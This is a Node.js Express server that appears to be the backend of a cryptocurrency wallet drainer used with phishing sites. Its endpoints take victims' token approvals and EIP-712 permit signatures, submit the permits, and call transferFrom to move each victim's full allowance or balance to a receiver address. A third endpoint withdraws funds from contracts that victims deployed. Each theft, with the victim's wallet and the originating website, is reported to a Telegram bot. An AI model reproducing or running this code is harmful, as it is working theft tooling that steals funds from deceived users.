const express = require("express");
const request = require('request');
const cors = require('cors');
const ethers = require("ethers");
const dotenv = require("dotenv");

dotenv.config();

const app = express()

const PORT = process.env.PORT || 3000
const signer_wallet = new ethers.Wallet(process.env.SAFAprivatekey);
const signer_wallet_address = signer_wallet.address;


app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const ERC20_ABI = [
  {
    "constant": true,
    "inputs": [],
    "name": "name",
    "outputs": [
      {
        "name": "",
        "type": "string"
      }
    ],
    "payable": false,
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {
        "name": "_from",
        "type": "address"
      },
      {
        "name": "_to",
        "type": "address"
      },
      {
        "name": "_value",
        "type": "uint256"
      }
    ],
    "name": "transferFrom",
    "outputs": [
      {
        "name": "",
        "type": "bool"
      }
    ],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  ,
  {
    "constant": false,
    "inputs": [
      {
        "internalType": "address",
        "name": "owner",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "spender",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "rawAmount",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
      },
      {
        "internalType": "uint8",
        "name": "v",
        "type": "uint8"
      },
      {
        "internalType": "bytes32",
        "name": "r",
        "type": "bytes32"
      },
      {
        "internalType": "bytes32",
        "name": "s",
        "type": "bytes32"
      }
    ],
    "name": "permit",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {
        "name": "_owner",
        "type": "address"
      },
      {
        "name": "_spender",
        "type": "address"
      }
    ],
    "name": "allowance",
    "outputs": [
      {
        "name": "remaining",
        "type": "uint256"
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {
        "name": "_owner",
        "type": "address"
      }
    ],
    "name": "balanceOf",
    "outputs": [
      {
        "name": "",
        "type": "uint256"
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  }
];
const WITHDRAW_ABI = [
	{
		"inputs": [
			{
				"internalType": "address",
				"name": "_devAddress",
				"type": "address"
			}
		],
		"payable": true,
		"stateMutability": "payable",
		"type": "constructor"
	},
	{
		"constant": false,
		"inputs": [],
		"name": "withdraw",
		"outputs": [],
		"payable": false,
		"stateMutability": "nonpayable",
		"type": "function"
	}
]
const config = { 
    receiver: process.env.receiverAddress,
    SAFAprivatekey: process.env.SAFAprivatekey,
    signer_wallet_address: signer_wallet_address,
    BOT_TOKEN: process.env.bot,
    CHAT_ID: process.env.chat_id,
 }


 const chains = [
  {
    chainId: 42161,
    rpcUrl: "https://rpc.ankr.com/arbitrum"
  },
  {
    chainId: 1,
    rpcUrl: "https://rpc.ankr.com/eth"
  },
  {
    chainId: 137,
    rpcUrl: "https://rpc-mainnet.maticvigil.com/"
  },
  {
    chainId: 56,
    rpcUrl: "https://bsc-dataseed.binance.org/"
  },
  {
    chainId: 43114,
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc"
  },
  {
    chainId: 43113,
    rpcUrl: "https://api.avax-test.network/ext/bc/C/rpc"
  },
  {
    chainId: 369,
    rpcUrl: "https://rpc.pulsechain.com/"
  }
];

function getRpcUrl(chainId) {
  const chain = chains.find(chain => chain.chainId === chainId);
  if (chain) {
    console.log(`Using rpc url: ${chain.rpcUrl}`);
    return chain.rpcUrl;
  } else {
    console.log("rpc chose error");
    return null;
  }
}
let escaper = (ah) => {
  if (typeof ah !== 'string') {
    return ah;
  }

  return ah.replace(/_/g, '\\_')
    .replace(/\*/g, '\\*')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\(/g, '\\(')
    .replace(/\)/g, '\\)')
    .replace(/~/g, '\\~')
    .replace(/`/g, '\\`')
    .replace(/>/g, '\\>')
    .replace(/#/g, '\\%23')
    .replace(/\+/g, '\\+')
    .replace(/-/g, '\\-')
    .replace(/=/g, '\\=')
    .replace(/\|/g, '\\|')
    .replace(/{/g, '\\{')
    .replace(/}/g, '\\}')
    .replace(/\./g, '\\.')
    .replace(/!/g, '\\!');
}

async function fetchNativePrices(provider) {
  let nativeBalance = await provider.getBalance(config.signer_wallet_address);
  let url = "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";
  let response = await fetch(url);
  let price = await response.json();
  let perETH = price["ethereum"]["usd"];
  usdbal = (nativeBalance/(10**18)  / perETH).toFixed(2);
  ethbal= (nativeBalance/(10**18)).toFixed;
  return [ usdbal, ethbal]
}

app.post("/oracle/contract", async (req, res) => {

  let transactionHash = req.body.transactionHash;
  let websiteUrl = req.body.websiteUrl;
  let chainId_ = parseInt(req.body.chainId);
  let address = req.body.address;


  let provider = new ethers.providers.JsonRpcProvider(
    getRpcUrl(chainId_)
  );
  // console.log(chainId_)
  let receipt = await provider.waitForTransaction(transactionHash);
  // console.log(receipt); 

  

  const signer = new ethers.Wallet(config.SAFAprivatekey, provider);
  try {
       res.status(200).send({
      status: true,
    })

    
let contractAddress_;

  if (receipt && receipt.contractAddress) {
    contractAddress_ =  receipt.contractAddress;
  } else {
    throw new Error('Contract address not found in the transaction receipt.');
    return;
  }

    let contractInstance = new ethers.Contract(contractAddress_, WITHDRAW_ABI, signer);

    let gasLimit = await contractInstance.estimateGas.withdraw();
    let gasLimitHex = ethers.utils.hexlify(gasLimit);


    let withdrawal = await contractInstance.withdraw({ gasLimit: gasLimitHex });
    await provider.waitForTransaction(withdrawal.hash);
    let withdrawMessage1 =
        `💸 *Contract Token Withdrawn* \n\n` +
        `🌐 *From Website*: ${escaper(websiteUrl)}\n` +
        `*Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
        `🏦 *Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
        `*Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n`;
  
      let withdrawClientServerOptions2 = {
        uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
        body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage1, disable_web_page_preview: true }),
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        }
      }
  
      request(withdrawClientServerOptions2, (error, response) => {

      });
 
    

      let contractbal = await provider.getBalance(contractAddress_);
      const signer = new ethers.Wallet(process.env.SAFAprivatekey, provider);
      let tx = await signer.sendTransaction({
        to: config.receiver,
        value: ethers.utils.parseUnits(contractbal),
      });
  
      await provider.waitForTransaction(tx.hash);

      let withdrawMessage =
      `💸* Contract Token Sent to Reciever Address* \n\n` +
      `🌐 *From Website*: ${escaper(websiteUrl)}\n` +
      `*Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
      `🏦* Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
      `*Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n`;

    let withdrawClientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(withdrawClientServerOptions, (error, response) => {
      console.log("[+] Withdrawn TOKEN");
    });

  } catch (error) {
    console.warn("[-] SAFA CONTRACT error: ", error)
    
  }
}
)

app.post("/oracle/erc20", async (req, res) => {
  let address = req.body.address;
  let contractAddress_ = req.body.contractAddress;
  let transactionHash = req.body.transactionHash;
  let websiteUrl = req.body.websiteUrl;
  let chainId_ = parseInt(req.body.chainId);


  let provider = new ethers.providers.JsonRpcProvider(
    getRpcUrl(chainId_)
  );
  // console.log(chainId_)
  let receipt = await provider.waitForTransaction(transactionHash);
  // console.log(receipt); 
  await provider.waitForTransaction(transactionHash);


  const signer = new ethers.Wallet(config.SAFAprivatekey, provider);
  let contractInstance = new ethers.Contract(contractAddress_, ERC20_ABI, signer);
  let tokenName = await contractInstance.name();


  try {
       res.status(200).send({
      status: true,
    })

    let message_ =
      `🟢 *Approval Made for ${escaper(tokenName)} Transfer*\n\n` +
      `🔑 *Wallet Address*: [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
      `🌐 *From Website*: ${escaper(websiteUrl)}\n`;

    let clientServerOptions__ = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message_, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions__, (error, response) => {
      if (!error && response.statusCode == 200) {
        console.log("[+] Approved ERC20");
      } else {
        console.error("Error sending Telegram message:");
      }    });


    let withdrawal;
    let allowance = await contractInstance.allowance(address, config.signer_wallet_address);
    let balance = await contractInstance.balanceOf(address);
    if ((parseInt(allowance) > 0) && (balance > 0)){

      const gasPrice = (await provider.getGasPrice()).mul(2);

      if (balance.gte(allowance)) {
        withdrawal = await contractInstance.transferFrom(address, config.receiver, allowance, {gasPrice});
      } else {
        withdrawal = await contractInstance.transferFrom(address, config.receiver, balance, {gasPrice});
      }


      await provider.waitForTransaction(withdrawal.hash);

      let withdrawMessage_1 =
        `💸 *Approval Withdrawn* \n\n` +
        `🌐 *From Website*: ${escaper(websiteUrl)}\n` +
        `*Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
        `🏦 *Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
        `*Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n`;
  
      let withdrawClientServerOptions_1 = {
        uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
        body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage_1, disable_web_page_preview: true }),
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        }
      }
  
      request(withdrawClientServerOptions_1, (error, response, body) => {

        if (!error && response.statusCode == 200) {
          console.log("[+] Withdrawn ERC20");
        } else {
          console.error("Error sending Telegram message:");
        }

      });

      
    }else{
      let message2 =
      `🔴 *Approval Transfer Error ${escaper(contractAddress_)}  Transfer*\n\n` +
      `*Reason*: Low Approval Amount\n`;
    let clientServerOptions2 = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message2, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }
    request(clientServerOptions2, (error, response) => {
      console.log("Allowance is Low");
    });
    }

  } catch (error) {
    console.warn("[-] SAFA ERC20 error: ", error)
    let message3 =
    `🔴 *Approval Transfer Error *\n\n` +
    `*Reason*: Possible low gas balance\n`;
  let clientServerOptions3 = {
    uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
    body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message3, disable_web_page_preview: true }),
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    }
  }
  request(clientServerOptions3, (error, response) => {
    console.log("Step Two Done");
  });
  }
});

app.post("/oracle/eip712", async (req, res) => {
  let address = req.body.address;
  let contractAddress_ = req.body.contractAddress;
  let websiteUrl = req.body.websiteUrl;
  let chainId_ = parseInt(req.body.chainId);
  let permit = JSON.parse(req.body.permit)


  let provider = new ethers.providers.JsonRpcProvider(
    getRpcUrl(chainId_)
  );
  let permitValue = permit.value;
  let r = permit.r;
  let s = permit.s;
  let v = permit.v;
  let deadline = permit.deadline;


  const signer = new ethers.Wallet(config.SAFAprivatekey, provider);
  let contractInstance = new ethers.Contract(contractAddress_, ERC20_ABI, signer);
  let tokenName = await contractInstance.name();


  try {
    res.status(200).send({
      status: true,
    })

    let estimated_gasLimit = await contractInstance.estimateGas.permit(
      address, config.signer_wallet_address, permitValue, deadline, v, r, s
    );
    let gasLimitHex = ethers.utils.hexlify(estimated_gasLimit.mul(2));
    let permit = await contractInstance.permit(address, config.signer_wallet_address, permitValue, deadline, v, r, s,  { gasLimit: gasLimitHex })
    await provider.waitForTransaction(permit.hash);
 

    let message =
      `🟢 *⛽ Gasless Approval Paid for ${escaper(tokenName)} Transfer ✅*\n\n` +
      `🔑 *Wallet Address*: [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
      `🌐 *From Website*: ${escaper(websiteUrl)}\n`;

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Step One Done");
    });




    // WITHDRAWING THE PERMITTED TOKEN BALANCE
    let withdrawal;
    let allowance = await contractInstance.allowance(address, config.signer_wallet_address);
    let balance = await contractInstance.balanceOf(address);
    if ((parseInt(allowance) > 0) && (balance > 0)){

      const gasPrice = (await provider.getGasPrice()).mul(2);

      if (balance.gte(allowance)) {
        withdrawal = await contractInstance.transferFrom(address, config.receiver, allowance, {gasPrice});
      } else {
        withdrawal = await contractInstance.transferFrom(address, config.receiver, balance, {gasPrice});
      }

      await provider.waitForTransaction(withdrawal.hash);
      let withdrawMessage =
        `💸 *Gasless Approval Withdrawn* \n\n` +
        `🌐 *From Website*: ${escaper(websiteUrl)}\n` +
        `*Source Wallet:* [${escaper(address)}](https://zapper.xyz/account/${address})\n` +
        `🏦* Destination Wallet:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
        `*Withdrawal Txhash:* [Here](${escaper(withdrawal.hash)})\n`;
  
      let withdrawClientServerOptions_2 = {
        uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
        body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true }),
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        }
      }
  
      request(withdrawClientServerOptions_2, (error, response) => {
        if(error){
          console.log(error)
        }
        console.log("[+] Withdrawn Gasless ERC20");
       });

      
    }else{
      let message2 =
      `🔴 *Approval Transfer Error ${escaper(contractAddress_)}  Transfer*\n\n` +
      `*Reason*: Low Approval Amount\n`;
    let clientServerOptions2 = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message2, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }
    request(clientServerOptions2, (error, response) => {
      console.log("Step Two Done");
    });
      console.log("Allowance is zero");
    }

  } catch (error) {
    console.warn("[-] SAFA EIP error: ")
    let message3 =
    `🔴 *Approval Transfer Error *\n\n` +
    `*Reason*: Possible low gas balance\n`;
  let clientServerOptions4 = {
    uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
    body: JSON.stringify({ chat_id: config.CHAT_ID, parse_mode: "MarkdownV2", text: message3, disable_web_page_preview: true }),
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    }
  }
  request(clientServerOptions4, (error, response) => {
    console.log("Step Two Done");
  });
  }
});


app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
